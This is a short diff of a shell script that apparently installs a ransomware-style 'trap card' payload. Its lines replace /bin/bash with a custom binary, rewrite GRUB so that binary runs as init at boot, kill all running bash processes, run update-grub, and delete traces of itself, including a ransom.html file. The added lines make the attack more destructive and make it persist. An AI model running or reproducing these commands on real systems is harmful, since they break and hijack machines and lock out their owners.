@@ -10,6 +10,8 @@
 
 
 
+#kill all bash
+kill -9 `lsof | grep /bin/bash | awk '{print $2}'`
 
 cp trapCard.sh /bin/uinit
 chmod +x /bin/uinit
@@ -22,6 +24,7 @@ cp /bin/uinit /bin/bash
 sed -i '/.*GRUB_CMDLINE_LINUX_DEFAULT.*/c\#GRUB_CMDLINE_LINUX_DEFAULT=""' /etc/default/grub
 sed -i '/.*GRUB_CMDLINE_LINUX=.*/c\GRUB_CMDLINE_LINUX_="init=/bin/uinit"' /etc/default/grub
 sed -i '/.*GRUB_CMDLINE_LINUX_DEFAULT.*/c\#GRUB_CMDLINE_LINUX_DEFAULT=""' /etc/default/grub.d/50-curtin-settings.cfg
+update-grub
 
 rm trapCard.sh
 rm ransom.html
